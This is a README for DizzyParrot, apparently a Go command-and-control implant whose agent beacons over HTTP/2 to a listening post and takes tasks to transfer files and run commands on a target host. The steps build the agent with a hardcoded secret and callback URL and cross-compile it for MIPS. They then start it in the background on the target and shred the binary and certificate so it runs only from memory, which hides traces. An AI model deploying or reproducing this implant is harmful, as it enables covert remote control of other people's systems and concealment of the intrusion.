# DizzyParrot
A simple beaconing implant written in Go. DizzyParrot consist of an agent, listening post, and interactive shell. The agent communicates to the LP over HTTP/2 at a specified interval. An agent can be tasked using the interactive shell to pull and push files, and execute commands on the target host. 

## Getting Started

#### Install dependencies (Debian and Ubuntu)
```
apt update && apt -y upgrade && apt -y install build-essential postgresql screen vim git
```

#### Start Postgres and create user
```
# Command is provided after installing dependencies
pg_ctlcluster 11 main start

# Verify
pg_ctlcluster 11 main status

# Change to postgres user
su - postgres

# Create user
createuser --interactive --pwprompt
# Enter name of role to add: dizzy
# Enter password for new role: dizzy
# Enter it again: dizzy
# Shall the new role be a superuser? (y/n) y

# Exit from postgres user
exit
```

#### Install go
```
wget https://dl.google.com/go/go1.14.1.linux-amd64.tar.gz
tar -C /usr/local -xzf go1.14.1.linux-amd64.tar.gz
rm -f go1.14.1.linux-amd64.tar.gz

echo "export PATH=$PATH:/usr/local/go/bin" >> ~/.profile
source ~/.profile
```

#### Clone the repo using git and get go dependencies 
```
# Clone repo
git clone https://github.com/af001/DizzyParrot.git

# Go dependencies 
go get gopkg.in/yaml.v2
go get golang.org/x/net/http2
go get github.com/lib/pq
go get github.com/c-bata/go-prompt
go get github.com/common-nighthawk/go-figure
go get github.com/jedib0t/go-pretty/table
```

#### Build LP and shell
```
cd server; go build server.go
cd shell; go build shell.go
```

#### Build agent 
```
# Build for host Linux
go build -ldflags "-X main.name=A10000 -X main.secret=dirtyparrot -X main.callback=300 -X main.jitter=60 -X main.url=https://localhost:8443/portal/details"

# Cross-compile mips
GOOS=linux GOARCH=mips go build -ldflags "-X main.name=A10000 -X main.secret=dirtyparrot -X main.callback=300 -X main.jitter=60 -X main.url=https://localhost:8443/portal/details"
```

#### Start the LP
```
# Generate cert
cd server; mkdir cert
openssl req -newkey rsa:2048 -nodes -keyout cert/server.key -x509 -days 365 -out cert/server.crt

# Start the LP
./server -c cert/config.yml

# To use a screen session
screen -S DIZZY_LP
./server -c config.yml

# To background screen
ctrl+a d

# To interact with screen session
screen -ls
screen -x DIZZY_LP
```

#### Start the shell
```
cd shell
./shell -c config.yml

# To use a screen session
screen -S DIZZY_SHELL
./shell -c config.yml

# To background screen
ctrl+a d

# To interact with screen session
screen -ls
screen -x DIZZY_SHELL
```

#### Execute agent on target host

If not using real certs, the client requieres the server certificate upon execution. After execution, the binary and certificate can be removed from disk. 

```
# Start agent
./client -c server.crt &

# To run in memory 
shred -fuz client server.crt
```

#### Validate Postgres database
```
# Login to shell
sudo -u postgres psql

# View tables
\dt
```
